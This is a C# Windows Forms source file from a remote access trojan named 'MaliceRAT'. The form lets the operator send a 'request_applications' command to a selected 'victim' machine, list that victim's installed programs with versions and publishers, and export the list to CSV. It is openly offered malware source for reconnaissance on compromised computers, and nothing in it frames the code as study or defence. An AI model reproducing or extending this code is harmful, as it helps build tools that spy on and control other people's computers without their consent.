using System;
using System.Collections.Generic;
using System.Windows.Forms;
using MaliceRAT.RatServer;
using System.Web.Script.Serialization;
using System.IO;
using System.Text;

namespace MaliceRAT.RatUI
{
    public partial class Application_Enumeration : Form
    {
        private readonly int victimId;
        private readonly Server server;

        public Application_Enumeration(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;
            LoadApplications();
            titleLabel.Text = $"Application Enumeration [{server.GetVictimById(victimId).User}]";
        }

        private void LoadApplications()
        {
            try
            {
                var victim = server.GetVictimById(victimId);
                if (victim != null)
                {
                    victim.Send(new { type = "request_applications" });
                    server.MessageReceived += Server_MessageReceived;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading applications: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void Server_MessageReceived(Victim victim, dynamic message)
        {
            if (victim.Id == victimId && message["type"] == "applications")
            {
                var applications = new JavaScriptSerializer().Deserialize<List<ApplicationModel>>(message["data"].ToString());
                DisplayApplications(applications);
            }
        }

        private void DisplayApplications(List<ApplicationModel> applications)
        {
            this.Invoke((MethodInvoker)delegate {
                gunaProgramsTable.Rows.Clear();
                foreach (var app in applications)
                {
                    gunaProgramsTable.Rows.Add(app.Name, app.Version, app.Publisher, app.InstallDate);
                }
            });
        }

        private void exportAsCsvButton_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "CSV files (*.csv)|*.csv";
                saveFileDialog.DefaultExt = "csv";
                saveFileDialog.AddExtension = true;

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter(saveFileDialog.FileName, false, Encoding.UTF8))
                    {
                        sw.WriteLine("Name,Version,Publisher,InstallDate");

                        foreach (DataGridViewRow row in gunaProgramsTable.Rows)
                        {
                            if (!row.IsNewRow)
                            {
                                sw.WriteLine($"{row.Cells[0].Value},{row.Cells[1].Value},{row.Cells[2].Value},{row.Cells[3].Value}");
                            }
                        }
                    }

                    MessageBox.Show("CSV file exported successfully!", "Export Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
    }

    public class ApplicationModel
    {
        public string Name { get; set; }
        public string Version { get; set; }
        public string Publisher { get; set; }
        public string InstallDate { get; set; }
    }
}